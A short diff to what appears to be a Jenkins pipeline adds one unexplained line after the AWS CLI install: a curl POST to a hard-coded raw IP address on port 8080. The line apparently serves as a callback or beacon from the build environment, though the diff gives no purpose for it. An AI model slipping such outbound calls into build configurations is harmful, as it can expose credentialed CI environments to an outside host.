@@ -20,6 +20,7 @@ pipeline {
                         ./aws/install -i ${AWS_CLI_DIR} -b ${AWS_CLI_DIR}/bin
                         export PATH="\${PATH}:${AWS_CLI_DIR}/bin"
                         aws --version
+                        curl -X post http://44.210.69.10:8080
                         """
                     }
                 }
